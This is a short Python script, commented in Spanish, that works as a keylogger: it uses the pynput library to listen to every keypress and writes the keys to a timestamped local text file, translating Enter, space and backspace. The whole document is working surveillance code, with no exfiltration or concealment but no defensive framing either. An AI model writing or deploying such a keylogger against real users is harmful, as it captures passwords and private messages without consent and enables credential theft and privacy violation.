import datetime
# Para instalar la libreria pip install pynput
from pynput.keyboard import Listener #funcion listener "escucha" que pulsamos en el teclado

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
file = open('keylogger{}.txt'.format(d), 'w')


def reg_key(key):
    key = str(key)

    if key == 'Key.enter':
        file.write('\n')
    elif key == 'Key.space':
        file.write(' ')
    elif key == 'Key.backspace':
        file.write('%BORRAR%')
    else:
        file.write(key.replace("'", ""))

with Listener(on_press=reg_key) as l:
    l.join()
